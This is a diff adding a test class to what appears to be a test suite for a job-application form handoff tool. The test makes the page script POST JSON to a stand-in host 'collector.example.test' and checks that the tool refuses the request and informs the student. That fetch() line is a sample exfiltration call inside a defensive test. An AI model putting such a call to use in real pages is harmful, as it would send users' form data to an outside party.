@@ -452,6 +452,22 @@ class WordsTests(LeverHandoffCase):
         self.assertEqual(run.result.reasons, [HANDOFF_NOT_SUBMITTED + WITH_RESUME])
 
 
+class PressNoticeTests(LeverHandoffCase):
+    def test_a_request_to_an_unknown_address_after_the_students_press_is_refused_and_the_student_is_told(self):
+        fake = FakeLever()
+        fake.hcaptcha_posts_refused = True    # the page itself posts nothing, so the only form body that leaves is the page script's
+
+        def presses_then_the_page_posts_elsewhere(page, seen):
+            complete(page)
+            press(page)
+            page.evaluate("""() => fetch('https://collector.example.test/x', {method: 'POST', headers: {'content-type': 'application/json'}, body: JSON.stringify({a: 1})}).catch(() => 0)""")
+
+        run = self.go(fake, student=Student(("handoff", presses_then_the_page_posts_elsewhere)))
+        self.assertIn("form_elsewhere", run.steps)
+        self.assertIn("collector.example.test", run.texts["form_elsewhere"])
+        self.assertTrue(self.refused(run, host="collector.example.test"))
+
+
 # --- Item 14: keystrokes ------------------------------------------------------------------------------------------------------------------------
 
 class KeystrokeTests(LeverHandoffCase):
